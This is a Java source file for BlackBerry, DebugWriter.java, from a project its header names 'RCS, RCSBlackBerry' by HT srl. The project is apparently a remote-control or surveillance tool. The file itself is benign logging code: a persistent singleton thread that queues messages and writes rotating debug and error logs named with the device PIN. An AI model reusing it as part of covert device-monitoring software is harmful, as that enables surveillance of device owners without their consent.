//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.utils
 * File         : DebugWriter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.debug;

import net.rim.device.api.system.EventLogger;
import net.rim.device.api.system.RuntimeStore;
import blackberry.Device;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.utils.Check;

/**
 * The Class DebugWriter.
 */
public final class DebugWriter extends Thread {

    static final String DEBUG_NAME = "D_";
    static final String ERROR_NAME = "E_";

    // static final String SD_PATH = Path.SD() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    // static final String FLASH_PATH = Path.USER() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    private static final long SLEEP_TIME = 1000;

    private static AutoFlashFile fileDebug;
    private static AutoFlashFile fileDebugErrors;

    private static final int MAX_NUM_MESSAGES = 5000;
    int numMessages;

    boolean toStop;
    boolean logToSD = false;
    boolean logToFile = true;
    boolean logToEvents = false;

    DebugQueue queue;

    //#ifdef EVENTLOGGER
    public static long loggerEventId = 0x98f417b7dbfd6ae4L;

    //#endif

    /**
     * Instantiates a new debug writer.
     * 
     * @param logToSD
     *            the log to sd
     */
    private DebugWriter() {

        toStop = false;
        queue = new DebugQueue();

    }

    static DebugWriter instance;
    static final long GUID = 0xbc56afac435c4a92L;

    public static synchronized DebugWriter getInstance() {

        if (instance == null) {
            instance = (DebugWriter) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {

                final DebugWriter singleton = new DebugWriter();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    private void createNewFile() {

        if (!logToFile) {
            return;
        }

        if (logToSD) {
            Path.createDirectory(Path.SD());
            fileDebug = new AutoFlashFile(debugDir(Path.SD())
                    + debugName(DEBUG_NAME), true);

            fileDebugErrors = new AutoFlashFile(debugDir(Path.SD())
                    + debugName(ERROR_NAME), true);
        } else {
            Path.createDirectory(Path.USER());
            fileDebug = new AutoFlashFile(debugDir(Path.USER())
                    + debugName(DEBUG_NAME), true);
            fileDebugErrors = new AutoFlashFile(debugDir(Path.USER())
                    + debugName(ERROR_NAME), true);
        }

        // log rotate
        if (fileDebug.exists()) {
            fileDebug.rotateLogs("D_");
        }

        fileDebug.create();

        // crea il log degli errori solo se non esiste, non si ruota
        if (!fileDebugErrors.exists()) {
            fileDebugErrors.create();
        }

    }

    private String debugName(String debugName) {
        return debugName + Device.getPin() + ".txt";
    }

    private String debugDir(String baseDir) {
        return baseDir + Path.DEBUG_DIR;
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Thread#run()
     */
    public void run() {
        //#ifdef DEBUG
        if (logToFile) {
            createNewFile();
        }
        //#endif

        //#ifdef DBC
        Check.asserts(fileDebug != null, "null filedebug");
        Check.asserts(fileDebugErrors != null, "null filedebugerrors");
        //#endif

        for (;;) {
            synchronized (this) {
                LogLine logLine = queue.dequeue();
                String message = logLine.message;
                int level = logLine.level;
                boolean error = logLine.error;

                if (logToFile) {
                    if (message.length() > 0) {
                        if (!fileDebug.exists()) {
                            fileDebug.create();
                        }
                        boolean ret = fileDebug.append(message + "\r\n");
                    }

                    // elabora l'errore

                    if (error) {
                        if (!fileDebugErrors.exists()) {
                            fileDebugErrors.create();
                        }
                        boolean ret = fileDebugErrors.append(message + "\r\n");
                    }

                    if (numMessages > MAX_NUM_MESSAGES) {
                        numMessages = 0;
                        fileDebug.rotateLogs("D_");
                        createNewFile();
                    } else {
                        numMessages += 1;
                    }
                }

                if (logToEvents) {

                    //TODO : spostare qui
                }
            }

            if (toStop) {
                break;
            }

            try {
                wait(SLEEP_TIME);
            } catch (final InterruptedException e) {
            }
        }
        //Utils.sleep((int) SLEEP_TIME);
    }

    /**
     * Stop.
     */
    public synchronized void requestStop() {
        toStop = true;
        notifyAll();
    }

    public void initLogToFile(boolean logToFlash, boolean logToSD2) {
        // TODO Auto-generated method stub

    }

    public void initLogToEvents(boolean logToEvents2) {
        //#ifdef EVENTLOGGER
        EventLogger.register(loggerEventId, "BBB", EventLogger.VIEWER_STRING);
        EventLogger.setMinimumLevel(EventLogger.DEBUG_INFO);
        //#endif
    }

    public boolean append(String message, int priority, boolean error) {
        //#ifdef DBC
        Check.requires(queue != null, "append: queue==null");
        //#endif
        return queue.enqueue(message, priority, error);
    }

}
